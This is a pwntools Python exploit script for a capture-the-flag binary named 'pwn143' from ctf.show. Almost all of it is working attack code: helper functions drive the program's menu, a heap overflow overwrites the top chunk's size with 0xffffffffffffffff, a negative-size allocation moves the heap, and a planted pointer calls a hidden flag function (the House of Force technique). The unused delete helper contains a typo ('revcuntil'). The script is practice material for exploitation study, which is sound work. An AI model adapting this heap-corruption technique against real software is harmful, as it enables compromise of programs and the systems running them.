from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
context.terminal = ['tmux', 'split-window', '-h', '-p', '50', '-c', '#{pane_current_path}']

#io = remote('pwn.challenge.ctf.show',28173)
GDBSCRIPT = r'''
'''
elf = ELF('./pwn143')
def start():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=GDBSCRIPT)
    io = process([elf.path])
    if args.ATTACH:
        gdb.attach(io, gdbscript=GDBSCRIPT)
    return io
def add(length,name):
        io.recvuntil("choice:")
        io.sendline('2')
        io.recvuntil(':')
        io.sendline(str(length))
        io.recvuntil(":")
        io.sendline(name)

def edit(idx,length,name):
        io.recvuntil("choice:")
        io.sendline('3')
        io.recvuntil(":")
        io.sendline(str(idx))
        io.recvuntil(":")
        io.sendline(str(length))
        io.recvuntil(':')
        io.sendline(name)

def delete(idx):
        io.revcuntil("choice:")
        io.sendline("4")
        io.recvuntil(":")
        io.sendline(str(idx))

def show():
        io.recvuntil("choice:")
        io.sendline("1")

def get_flag():
        io.recvuntil("choice:")
        io.sendline("5")

io = start()
flag = elf.sym['fffffffffffffffffffffffffffffffffflag']
add(0x30,b'aaaa')

payload  = 0x30 * b'a'
payload += b'a' * 8 + p64(0xffffffffffffffff)

edit(0,0x41,payload)
pause()
offset = -(0x60+0x8+0xf)
add(offset,'aaaa')
pause()
add(0x10,p64(flag) * 2)
get_flag()

io.interactive()